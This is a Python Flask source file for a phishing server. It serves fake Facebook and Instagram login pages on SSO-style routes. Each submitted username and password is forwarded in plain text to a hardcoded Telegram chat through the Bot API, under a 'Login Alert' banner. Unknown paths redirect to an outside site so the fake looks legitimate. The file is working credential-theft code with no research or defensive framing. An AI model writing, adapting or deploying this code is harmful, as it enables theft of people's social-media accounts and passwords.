from flask import Flask, render_template, request, redirect, url_for
from dotenv import load_dotenv
import requests
import os

load_dotenv()
app = Flask(__name__)

def sendTelegram(request, platform):
    # Extracting form data

    
    username = request.form['username']
    password = request.form['password']

    # Telegram bot credentials and endpoint
    bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
    if not bot_token:
        return 'Error: Telegram bot API key not found in environment variable'
    chat_id = '-1001910421731'
    send_message_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

    # Crafting the message in Markdown style for better readability
    if platform == 'facebook':
        message_text = (
            "🚨 *Login Alert from Facebook* 🚨\n"
            "_Someone attempted a login, details below._\n\n"
            f"*Username:*\n`{username}`\n"
            f"*Password:*\n`{password}`"
        )
    elif platform == 'instagram':
        message_text = (
            "🚨 *Login Alert from Instagram* 🚨\n"
            "_Someone attempted a login, details below._\n\n"
            f"*Username:*\n`{username}`\n"
            f"*Password:*\n`{password}`"
        )

    # Data structure required by Telegram API
    message_data = {
        'chat_id': chat_id,
        'text': message_text,
        'parse_mode': 'Markdown'
    }

    # Post the message on Telegram
    response = requests.post(send_message_url, data=message_data)

    # Handling the response
    if response.status_code != 200:
        print('Error sending message to Telegram')
        return 'Error sending message to Telegram'

    print('Message sent to Telegram successfully!')
    return 'Login data sent!'



@app.errorhandler(404)
def error404(e):
    return redirect('https://s-usm.md')

@app.route('/login/instagram', methods=['GET'])
def authorize():
    # Serve the authorization page on a GET request
    return render_template('authorize.html')

@app.route('/sso/facebook/authorize', methods=['GET', 'POST'])
def facebook():
    if request.method == 'POST':
        # Process and handle the login data
        sendTelegram(request, 'facebook')
        # Redirect to the login page after POST request
        return redirect(url_for('facebook'))
    else:
        # Serve the login page on a GET request
        return render_template('facebook.html')

@app.route('/sso/instagram/authorize', methods=['GET', 'POST'])
def instagram():
    if request.method == 'POST':
        # Process and handle the login data
        sendTelegram(request, 'instagram')
        # Redirect to the login page after POST request
        return redirect(url_for('instagram'))
    else:
        # Serve the login page on a GET request
        return render_template('instagram.html')

if __name__ == '__main__':
    # Running the app on the local development server
    app.run(debug=False)
